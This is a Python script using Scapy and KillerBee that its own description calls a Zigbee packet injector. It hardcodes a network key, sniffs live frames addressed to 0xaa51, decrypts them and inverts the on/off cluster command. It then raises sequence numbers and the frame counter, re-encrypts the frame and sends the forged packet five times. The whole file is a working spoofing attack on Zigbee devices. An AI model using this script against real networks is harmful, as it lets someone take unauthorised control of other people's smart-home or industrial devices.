from scapy import *
from killerbee.scapy_extensions import *
import argparse
from crc_itu import crc16

parser = argparse.ArgumentParser(description="Zigbee packet injector")
parser.add_argument("-c", type=int, dest="channel", choices=range(11, 25) , default=14)

args = parser.parse_args()

key = bytes.fromhex("c7398de1956fbe125d3463a58f1e3a3c")

#pkts = kbrdpcap("/home/kali/Downloads/test.pcap")

def craftPacket(pkt, data):
    pkt[0].getlayer("Dot15d4").seqnum += 10
    pkt[0].getlayer("ZigbeeNWK").seqnum += 10
    data.getlayer("ZigbeeAppDataPayload").counter += 10
    data.getlayer("ZigbeeClusterLibrary").transaction_sequence += 1
    data.getlayer("ZigbeeClusterLibrary").command_identifier ^= 0x01
    pkt = kbencrypt(pkt[0], data, key)
    print("\n\n********PACKET SHOW*******\n\n")
    pkt.show()
    print("\n\n********DECRYPT SHOW BEFORE FC*******\n\n")
    kbdecrypt(pkt, key).show()
    pkt.getlayer("ZigbeeSecurityHeader").fc += 1
    #pkt.getlayer("ZigbeeSecurityHeader").data += b'\xaa\xaa\xaa\xaa' 
    return pkt
    #kbdecrypt(pkt, key).show()

dev = KillerBee(device=kbutils.devlist()[0][0])

try:
    while True:
        time.sleep(0.1)
        pkt = kbsniff(iface=dev, count=1, channel=14, lfilter=lambda x: x.haslayer("Dot15d4Data") and x.getlayer("Dot15d4Data").dest_addr==0xaa51)

        pkt[0].show()
        if pkt[0].haslayer("ZigbeeSecurityHeader"):

            pkt[0].getlayer("ZigbeeSecurityHeader").data = pkt[0].getlayer("ZigbeeSecurityHeader").data[0:-2]
            dec = kbdecrypt(pkt[0], key)
            #kbencrypt(pkt[0], dec, key).show()

            if (dec.haslayer("ZigbeeClusterLibrary")) and (dec.getlayer("ZigbeeClusterLibrary").command_identifier == 0 or dec.getlayer("ZigbeeClusterLibrary").command_identifier == 1): 
                pkt = craftPacket(pkt, dec)
                print("\n\n********NEW PACKET********")
                pkt.show()
                for i in range (0,5):
                    kbsendp(pkt, 14, iface=dev)
                    time.sleep(1)
except KeyboardInterrupt:
    dev.close()

    